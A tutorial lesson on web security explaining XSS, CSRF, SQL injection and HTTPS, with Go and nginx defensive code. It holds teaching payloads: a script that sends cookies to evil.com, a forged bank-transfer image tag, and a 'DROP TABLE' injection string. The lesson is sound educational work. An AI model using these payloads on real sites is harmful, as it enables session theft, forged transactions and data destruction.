# DAY28: Web Security — XSS, CSRF, SQL Injection, and HTTPS

---

## The anecdote: "Security is locking your doors at night"

A house without security:

| Unlocked house | Unsecured website |
|----------------|-------------------|
| Front door unlocked | No HTTPS (anyone can read traffic) |
| Window left open | XSS (attacker can run scripts in your browser) |
| Spare key under the mat | CSRF (attacker can trick you into actions) |
| No lock on the back door | SQL injection (attacker can read your database) |
| Notes everywhere with your schedule | Information leakage |

Security isn't one big lock. It's multiple layers — just like a house has door locks, window locks, an alarm system, and maybe a security camera.

---

## XSS — Cross-Site Scripting

**What it is:** An attacker injects malicious JavaScript into a web page viewed by other users.

```
Attacker: "Hey, look at this comment!"
    ↓ Posts: <script>fetch('https://evil.com/stolen?'+document.cookie)</script>
    ↓
Website displays the comment without sanitizing
    ↓
Alice views the page → script runs → Alice's cookies sent to attacker
```

**Prevention:**
- Never trust user input
- Escape output (HTML-encode `<script>` to `&lt;script&gt;`)
- Set `Content-Security-Policy` header
- Use `HttpOnly` cookies (JS can't read them)

```go
// Safe: HTML escape user input
template.HTMLEscapeString(userComment)
// Or use Go's html/template package (auto-escapes)
```

---

## CSRF — Cross-Site Request Forgery

**What it is:** An attacker tricks a user into performing an action on another site where they're authenticated.

```
1. Alice is logged into bank.com
2. Alice visits evil.com
3. evil.com has: <img src="https://bank.com/transfer?to=hacker&amount=1000">
4. Browser sends the request with Alice's cookies
5. Bank transfers $1000 to hacker
```

**Prevention:**
- Use CSRF tokens (random value in a hidden form field)
- Set `SameSite` cookie attribute to `Lax` or `Strict`
- Require `Origin` or `Referer` header check
- Don't use GET for state-changing operations

---

## SQL Injection

**What it is:** An attacker injects SQL commands through input fields.

```go
// DANGER: String concatenation
query := "SELECT * FROM users WHERE name='" + userName + "'"

// If userName = "'; DROP TABLE users; --"
// This becomes:
// SELECT * FROM users WHERE name=''; DROP TABLE users; --'
// Database: done and done
```

**Prevention:**
- Use **parameterized queries** (NEVER concatenate SQL)

```go
// SAFE: Parameterized query
rows, err := db.Query("SELECT * FROM users WHERE name = $1", userName)
```

---

## HTTPS Everywhere

**What it protects against:**
- Man-in-the-middle (someone on your WiFi can read everything)
- Cookie theft (session hijacking)
- Content injection (inserting ads/malware into your pages)

```nginx
# Always redirect HTTP to HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}

# HSTS: tell browsers to ALWAYS use HTTPS
server {
    listen 443 ssl;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
```

---

## Security headers checklist

```go
func securityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy",
            "default-src 'self'; script-src 'self'")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("X-XSS-Protection", "1; mode=block")
        w.Header().Set("Strict-Transport-Security",
            "max-age=31536000; includeSubDomains")
        next.ServeHTTP(w, r)
    })
}
```

---

## Senior mindset: "Defence in depth"

No single security measure is enough. Layers:

1. **HTTPS** — encrypts everything in transit
2. **HttpOnly cookies** — prevents XSS from stealing sessions
3. **CSRF tokens** — prevents cross-site requests
4. **Parameterized queries** — prevents SQL injection
5. **Input validation** — rejects bad data early
6. **Content Security Policy** — limits what scripts can run
7. **Rate limiting** — prevents brute force attacks

If one layer fails, the others catch it.

---

## Summary

| Attack | What it does | Prevention |
|--------|-------------|------------|
| XSS | Injects scripts into pages | Escape output, CSP header |
| CSRF | Forges authenticated requests | CSRF tokens, SameSite cookies |
| SQL injection | Injects SQL commands | Parameterized queries |
| MITM | Reads/modifies traffic | HTTPS everywhere |
| Session hijacking | Steals cookies | HttpOnly, Secure, SameSite |
